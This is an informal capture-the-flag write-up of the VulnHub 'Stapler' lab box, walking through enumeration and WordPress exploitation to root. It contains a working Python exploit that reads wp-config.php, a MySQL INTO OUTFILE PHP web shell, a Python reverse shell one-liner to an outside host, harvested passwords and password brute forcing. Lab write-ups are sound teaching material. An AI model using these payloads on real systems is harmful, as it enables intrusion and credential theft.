# **Where is the goddamn stapler??**

Sooo let's go!! 
first we need to see where our VM send data
after launching your VM (and waiting a bit), do a sudo netdiscover to see the IP  
we got "PCS Systemtechnik GmbH" at IP -->  

```c
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.122.1   00:50:56:c0:00:08     17    1020  VMware, Inc.
 192.168.122.2   00:50:56:f9:41:35      2     120  VMware, Inc.
 192.168.122.136 08:00:27:64:3a:85      4     168  PCS Systemtechnik GmbH
 192.168.122.254 00:50:56:e3:bb:e4      1      60  VMware, Inc.    
```

so let's just do a nmap of this IP`to see open port and things(i've cutted what's not interisting)

```
romain@kali:~/prog/ctf/stapler$ sudo nmap -sS -A -O -n 192.168.122.136
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-21 18:19 CEST
Nmap scan report for 192.168.122.136
Host is up (0.0014s latency).
Not shown: 992 filtered ports
PORT     STATE  SERVICE     VERSION

20/tcp   closed ftp-data

21/tcp   open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.122.134
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp   open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)

53/tcp   open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75

80/tcp   open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found

139/tcp  open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)

666/tcp  open   doom?
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9

3306/tcp open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, Support41Auth, Speaks41ProtocolOld, LongPassword, ConnectWithDatabase, LongColumnFlag, SupportsTransactions, SupportsCompression, FoundRows, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt:       :VmLC~\x19\x1CY\x18ky\x06pyw%9\x1F
|_  Auth Plugin Name: mysql_native_password

---------------- cutted -----------------
```

there is a ton shit of informations and in those we can see differents attacks angles:
 	-ftp/ssh/mysql/??doom??/http/netbios/domain
 An interesting fact is that the ftp on port 21 allow anonymous login but without listing (code 230) and we got the following information: 

```
| FTP server status:
|      Connected to 192.168.122.134
```



## First try throught FTP

So let's try to connect to this, it's an ftp so let's us ftp 192.168.122.136
when we log in, he asked for a name and a passwd, i login as `login:anonymous mdp:anonymous`
Yes got a session ;)

now let's understand where we are, let's ls --> there is a file called note
so let's type: `get note`, file copied on our main machine, perfect let's exit and read it, 

Here is the note:
>Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.

ntg interisting, no another attack angles but we do have names!, can be cool in the last phases
(We also have the name Harry at the beginning of the FTP, let's keep it in mind!!)



## So let's try throught ssh instead of ftp

We'll continue by testing another open ports such as ssh --> ssh root@192.168.122.136 
nothing in return but we do have another name --> Barry, we never know it can be really useful

Ok let's try another entry, we do have domain, euuu shit i don't know what to do in front of this one lol
Http just return a 404 error so i don't mind it for now



## Netbios Samba? what's that?

Jumping to the next one --> alright we have netbios-ssn
netbios is not a really popular thing (i don't know but I've never saw it before) 
so here is a description: **Network Basic Input/Output System.**
It provides services related to the session layer of the OSI model allowing applications on separate computers to communicate over a local area network.
*Thanks WikiPedia! Really cool!*

Here this is a "samba" netbios, alright after a little search i just have to do a `nmblookup -A 192.168.122.136` to see the actives groups --> the informations say stg about a "workgroup"
I did a `apropos nmb` to see different functions about nmb, let's us `smbclient -L 192.168.122.136`
fxck i do have no passwd, let's type a random one we still get a part of the informations!

```
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
```

Apparently Fred do have access to Kathy file, maybe there is a way to be in the middle of those "conversations"
maybe i can try accessing kathy's data throught Fred account, maybe just checking will be enough? 
so let's use a `smbclient //fred/kathy -I 192.168.122.136 -N`

and apparently it worked !!  let's do an ls --> we got backup et kathy_stuff, it works such as ftp so just use `get` to copy to local file
i'll copy all just in case, in the todo we have the name of a society who's initech

and now the real part! --> a whole config file with a wordpress!!
so i'll do the same to see the tmp of fred bc he dont seems to protect a lot of things ;)
`smbclient //fred/tmp -I 192.168.122.136 -N`
And we have a ls file,euuuu yes? i guess it's the result of an ls on a his computer maybe?
it shows up a ls file and a directory ? with a really weird name:
`systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ`
systemd is for a daemon if i have a good memory ,and we can see timesyncd.
 actually i have no fxxking idea how to exploit it

Before exploiting the wordpress, i'll try the last option that is our mysql server on port 3306 
>Rom1 from the future here, after finishing I notice that I hhaven't used it at all!



## Let's do some web test!

And one thing was tickling me, we see a lot of "web things" and nothing for a website except a 404 error, so i redo a scan on the b"asic web range" ----> `nmap -p 10000-20000 192.168.122.136`
AND I MISSED AN UNKNOWN ONE on port 12380 --> let's try it, i'm pretty sure that's a website(thats what i'm looking for)

That's a website in build... In the comment of the html We just have a new name --> Zoe, apparently she's not in the entreprise but they want her to be in, alright, cool, i guess?..
>Rom1 from the future again, just open the ipaddress with :12380 at the end in a webBrowser to see it!

This way i'm not gonna get a lot of informations ://, so
i decided to test this website to see any interesting thing i could get :) 

An efficient way to check for vulnerabilities is Nikto, there are a tons of other software but I'll use this one this time (w3af, owasp ZAP, websecurify are also amazing)
so let's do it: 

```bash
nikto -h 192.168.122.136:12380
```

we have some interesting things such as an entry **/admin112233/** in **robots.txt** whose accessible and a **/blogblog/** too
and the robots is accessible too!!! 
Let's start from here, don't forget to put the *https://* before the link to get it right, and so on u can type robots.txt just after!
we got this:

```bash
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```

I try /admin112233/ and got this messages --> "This could of been a BeEF-XSS hook ;)", with a link to an xss page
Okay I just got trolled..... f**k.....
**CONCLUSION**: remember to block auto js if you don't want to geeet trapped like i did ;)


### a blog, yeahh aammaaazziing 

after that i just go to */blogblog/* to see what's in, that's a basic blog, with some name in it, nothing really interesent
i tried entering some php and js in the comment but ntg so i passed one(too easy lol)

And there is a login section with wordpress --> good for us lets do a wpscan to see any vulnerabilities!!

```bash
sudo wpscan --disable-tls-checks --url https://192.168.122.136:12380/blogblog/ --enumerate u 
```

Ànd her i got all the users! :
    -tim
    -elly
    -kathy
    -scott
    -harry
    -heather
    -barry
    -garry
    -peter
    -john
    -John Smith

in the header we find this : - Dave: Soemthing doesn't look right here
Then let's do an aggressive check for the vulnerable plugins --> 

```bash
sudo wpscan --disable-tls-checks --url https://192.168.122.136:12380/blogblog/ --plugins-detection aggressive
```

after a few minutes i got a huge results --> we got some errors that might be interesting such as shortcode/ videoembed and two -factor
Here is a cutted version:

```
-------------------------------------------------------------cutted----------------------------------------------------------------
[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:05:43 <===============================================================================================================> (86199 / 86199) 100.00% Time: 00:05:43
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.122.136:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-10-14T13:52:00.000Z
 | Readme: https://192.168.122.136:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.122.136:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.122.136:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt

[+] akismet
 | Location: https://192.168.122.136:12380/blogblog/wp-content/plugins/akismet/
 | Latest Version: 4.1.4
 | Last Updated: 2020-03-17T20:49:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.122.136:12380/blogblog/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] shortcode-ui
 | Location: https://192.168.122.136:12380/blogblog/wp-content/plugins/shortcode-ui/
 | Last Updated: 2019-01-16T22:56:00.000Z
 | Readme: https://192.168.122.136:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | [!] The version is out of date, the latest version is 0.7.4
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.122.136:12380/blogblog/wp-content/plugins/shortcode-ui/, status: 200
 |
 | Version: 0.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.122.136:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt

[+] two-factor
 | Location: https://192.168.122.136:12380/blogblog/wp-content/plugins/two-factor/
 | Latest Version: 0.5.1
 | Last Updated: 2020-02-12T19:41:00.000Z
 | Readme: https://192.168.122.136:12380/blogblog/wp-content/plugins/two-factor/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.122.136:12380/blogblog/wp-content/plugins/two-factor/, status: 200
 |
 | The version could not be determined.
 ---------------------------------------------------------------------cutted--------------------------------------------------------------------
```


And here is our savior:
[I do love exploit db so much](https://www.exploit-db.com/exploits/39646)

So let's just run our exploit, after modifying some shit that didnt worked well it worked and i can access the wp-content file
Here is the code i runned:

```python
# Exploit - Print the content of wp-config.php in terminal (default Wordpress config)
#### USE PYTHON2 TO USE THIS SCRIPT

import random
import urllib2
import re
import ssl

ssl._create_default_https_context = ssl._create_unverified_context
url = "https://192.168.122.136:12380/blogblog" # insert url to wordpress

randomID = long(random.random() * 100000000000000000)

objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
content =  objHtml.readlines()
for line in content:
  numbers = re.findall(r"\d+",line)
  if len(numbers) != 0:
    id = numbers[-1]
    id = int(id) / 10

objHtml = urllib2.urlopen(url + '/?p=' + str(id))
content = objHtml.readlines()

for line in content:
  if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
    urls=re.findall('"(https?://.*?)"', line)
    print urllib2.urlopen(urls[0]).read()
```


After going in, i see different things but what i was interested in was the "upload part", there is an image that can't be opened 
Pretty sure there is stg hidden in, let's download it without any extension by using : 

```bash
curl -k https://192.168.122.136:12380/blogblog/wp-content/uploads/146817183.jpeg > data/img
#-k is used for unsececure domain
```

alright so the img contains php code, **AND BABY WHAT A CODE** !!  
we got the configuration of the mysql with the password !!!
knowing that we've one last unexplored port dedicated to sql (and the demonic one but i'll have a look after finishing the box)
Here is the cool bit of this img file:

```php
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```



## Hey dud, u want some DB ? i got a lil mysql for u

So let's connect to our mysql
`mysql -u root -p -h 192.168.122.136`
and type the passwd by your own

So yea here i am in the db as root!
let's grab some informations, `show databases;` and we got all the db, so i did go around all of that but ntg was really interesting
but then i tap --> `use wordpress; show tables;`

and then we want to know what's inside "wp users" so let's do `describe wp_users;`

`SELECT * FROM wp_users`

Here is the total output:

```bash
MySQL [wordpress]> show tables
    -> ;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.002 sec)

MySQL [wordpress]> describe wp_users
    -> ;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(64)         | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   |     |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(60)         | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.002 sec)

MySQL [wordpress]> SELECT * FROM wp_users 
    -> ;
+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
| ID | user_login | user_pass                          | user_nicename | user_email            | user_url         | user_registered     | user_activation_key | user_status | display_name    |
+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
|  1 | John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. | john          | john@red.localhost    | http://localhost | 2016-06-03 23:18:47 |                     |           0 | John Smith      |
|  2 | Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 | elly          | Elly@red.localhost    |                  | 2016-06-05 16:11:33 |                     |           0 | Elly Jones      |
|  3 | Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 | peter         | peter@red.localhost   |                  | 2016-06-05 16:13:16 |                     |           0 | Peter Parker    |
|  4 | barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 | barry         | barry@red.localhost   |                  | 2016-06-05 16:14:26 |                     |           0 | Barry Atkins    |
|  5 | heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 | heather       | heather@red.localhost |                  | 2016-06-05 16:18:04 |                     |           0 | Heather Neville |
|  6 | garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 | garry         | garry@red.localhost   |                  | 2016-06-05 16:18:23 |                     |           0 | garry           |
|  7 | harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 | harry         | harry@red.localhost   |                  | 2016-06-05 16:18:41 |                     |           0 | harry           |
|  8 | scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 | scott         | scott@red.localhost   |                  | 2016-06-05 16:18:59 |                     |           0 | scott           |
|  9 | kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 | kathy         | kathy@red.localhost   |                  | 2016-06-05 16:19:14 |                     |           0 | kathy           |
| 10 | tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 | tim           | tim@red.localhost     |                  | 2016-06-05 16:19:29 |                     |           0 | tim             |
| 11 | ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 | zoe           | zoe@red.localhost     |                  | 2016-06-05 16:19:50 |                     |           0 | ZOE             |
| 12 | Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. | dave          | dave@red.localhost    |                  | 2016-06-05 16:20:09 |                     |           0 | Dave            |
| 13 | Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 | simon         | simon@red.localhost   |                  | 2016-06-05 16:20:35 |                     |           0 | Simon           |
| 14 | Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. | abby          | abby@red.localhost    |                  | 2016-06-05 16:20:53 |                     |           0 | Abby            |
| 15 | Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 | vicki         | vicki@red.localhost   |                  | 2016-06-05 16:21:14 |                     |           0 | Vicki           |
| 16 | Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 | pam           | pam@red.localhost     |                  | 2016-06-05 16:42:23 |                     |           0 | Pam             |
+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
```


i wanted to get the original password that are in MD5sum, but it does not work at all with some online md5 tools and I do suck at using the appropriate tools lol (one day i'll work on it)

Her i have to find another solution, i can try to inject a file as a db administrator maybe?
or i can bruteforce a password since i remember that elly should have stg interesting( i think it was a remote, i started like 2days ago lol)
Let's first get it from an injection (bc god i do love injection)
and i can also do an injection throught the comments and "validate them" with an update from db
>Rom1 from the future, I think i've tried and i don't remember if it got useful or not lol

but i wanna put a shell inside to get data so it'll be more interesting and easier to inject it from root
So let's use the data base administrator technique!!
i will put some `php shell_exec` into a file i wanna upload to "wp-content" so i can access it by my "client" side

```sql
SELECT "<?php echo shell_exec(ls);?>" INTO outfile "/var/www/https/blogblog/wp-content/uploads/shelltest.php";
```

Ìt does work pretty well!
the time my brain use to reflect a bit, i thought that maybe having some commands without having to upload a new sh all the time would be a great idea
so let's just replace ls by $_GET=["cmd"]
so in my url i just have to tap ?cmd=mycommand at the end and so i do have a new call all the time!!!


## TIme for some reversed shell!

Now have a look at this:
[A really useful CheatSheet i do keep w/ me](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

I tried with bash/nc/php and perl but none worked so i tried the py one and it does work(  change the ip and the port to your own )

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

so yeah so cool i got a reversed shell, now it's time to spawn a tty in the website
[Another useful link, go have a look](https://netsec.ws/?p=337)

AND SCREW IT once again only py works, why seriously i dont understand?????
but alright we have now a tty

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

And follow the complete things in the link i put upper to get your /bin/bash from your own terminal
Because what i've done here is basically starting a remote /bin/bash that is directly send to one of your port on your own Ip address and like so you get access and can control it 
The logic is I listen to one of my port and then i decide to send the remote of the shell i've spawned  into the webservice 

>Hey ssup Rom1 from the fture once again, It was logic for me but i notice it's not really, those command are meant to be passe as the command argument in the shell_exec we've created upper, like so:
  https://192.168.122.136:12380/blogblog/wp-content/uploads/shelltest.php?cmd=python -c 'import pty;pty.spawn("/bin/bash")'
  So to listen to a port let's just use a `nc -vnl -p 443` and now the shell u spawn from you're php code have to be directed to ur ip address with the port 443



## I'm in *James bond music starts*

Once i'm in what i want to do is to see all the users commands (what they've typped in their terminal)so they guide me directly to importants files
bash_history does keep those informations so let's go

this command will so the work for us: `find -name ".bash_history" -exec cat {} \;`

and so one we got a lot of informations
and we have some ppl that have decided to connect with ssh and so we does have their passwd !! 

```bash 
sshpass -p thisimypassword ssh JKanode@localhost
#apt-get install sshpass      <--useless
sshpass -p JZQuyIN5 peter@localhost
```

so let's connect throught ssh
`ssh peter@192.168.122.136`


and does peter can use sudo?? GODDAMN YESSSSS
alright boiiis we're close to the end!! 

so i tried to get to my /root but nothing. the command seems to be blocked

so i thought about the "interactive mode" of sudo --> `sudo -i`
and then i'm able to navigate to it
HERE ARE THE FILE: 

```
----------<(Congratulations)>------------
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

HERE IS OUR FLAG BAAAABBYYYYY !!! 
we did itt;)))

```

                                __..--''\
                        __..--''         \
                __..--''          __..--''
        __..--''          __..--''       |
        \ o        __..--''____....----""
         \__..--''\
         |         \
        +----------------------------------+
        +----------------------------------+

```



# **SOME EXTRAS**

## I am very salty
i would liketo get into this box another way,
maybe way more easier but interesting too!

When we was juuust after our mysql root access, we do have access to all the names and things like that
we can try to bruteforce into by stg i read at the beginning

Apparently elly does have a ftp access on her home folder
so i'll try to bruteforce elly account. For the passwd i'll use the rock word listing that every kali have
You can find it only easly

`wpscan  --url https://192.168.122.136:12380/blogblog -P /usr/share/wordlists/rockyou_5max.txt -U 'elly' --disable-tls-checks`
that give us ylle as password after way too much time
seriously f..k you at this point those passwd just make me lose time lol 

let's connect via ftp
and there is a tonshit of data once again
except the paasswd i didnt find anything interesting
And so i have the different users, 
I should do like an another bruteforce but gosh ENOUGH
i do hate to wait and it'll get me at the point where i had the ssh connection
and i would have list all the bash history all the same



## What's that demonic port???

And about the 666Port so i decided to get in and there are a loooot of encrypted data except a message2.jpeg
so let's get it boiiis
`wget 192.168.122.136:666` and i get a html file, but after a `file thisfile.html` i see that it's a zip archive

so after a `unzip` i do have my image who just print out a hello world and a segmentation fault?
nothing else?? so i just do a `string message2.jpeg`
it just tell me that i should get a cookie, euu yep cool, i'll have one so !
I did a bin walk on the archive but i just got what i excepted, ntg magic :/
so to conclude nothing to see on this one !!



That was a pretty easy yet pretty fun box to do!!
Thanks TO the author and to VulnHub!!